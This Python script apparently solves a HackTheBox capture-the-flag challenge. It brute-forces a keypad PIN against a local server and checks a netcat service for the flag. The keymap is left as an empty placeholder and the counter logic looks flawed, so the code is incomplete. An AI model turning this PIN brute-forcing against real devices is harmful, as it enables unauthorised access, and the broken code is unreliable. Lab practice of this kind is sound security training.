import socket
import time

def run_client(server_host, server_port, nc_host, nc_port):
	keymap = {
		# Define your keymap as previously given
	}

	def simulate_keypad_read(command, key_presses, current_key_to_send):
	    """
	    Simulate keypad responses for different commands.
	    """

	    if command == 'F0':  # Example: simulate that a key in the first row is pressed
	        key = key_presses[current_key_to_send]

	        return keymap[key][0] + '\n'

	    elif command == '0F':  # Example: simulate that a key in the first column is pressed
	        
	        key = key_presses[current_key_to_send]

	        current_key_to_send += 1

	        return keymap[key][1] + '\n'

	        
	    else:
	        return 'FF\n'  # Simulate no key pressed or invalid command


	def interact_with_nc(sock_nc):
		sock_nc.sendall(b"system\n")  # Send 'system' command
		time.sleep(0.5)  # Allow some time for response
		response = sock_nc.recv(4096).decode('utf-8')
		print("Received from NC server:", response)
		return 'HTB{' in response

	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
		sock.connect((server_host, server_port))
		print("Connected to server")

		for pin in range(5000, 5255):
			key_presses = f"{pin:04d}#"  # Format pin
			current_key_to_send = 0

			while current_key_to_send < len(key_presses):
				data = sock.recv(1024).decode('utf-8').strip()
				if not data:
					print("Server closed the connection")
					break

				print(f"Received from server: {data}")

				response = simulate_keypad_read(data, key_presses, current_key_to_send)
				current_key_to_send += 1

				if response:
					sock.sendall(response.encode('utf-8'))

				if data == 'quit':
					print("Quit command received")
					break

			# After sending the PIN, interact with the netcat server
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock_nc:
				sock_nc.connect((nc_host, nc_port))
				print(f"Connected to NC server after sending PIN: {pin}")

				sock_nc.recv(1024)  # Read the welcome and initial messages

				if interact_with_nc(sock_nc):
					print(f"Success! The correct PIN is: {pin}")
					return  # Exit if 'HTB{' found in the response

if __name__ == "__main__":
	SERVER_HOST = 'localhost'
	SERVER_PORT = 1338
	NC_HOST = '0.0.0.0'
	NC_PORT = 1337
	run_client(SERVER_HOST, SERVER_PORT, NC_HOST, NC_PORT)
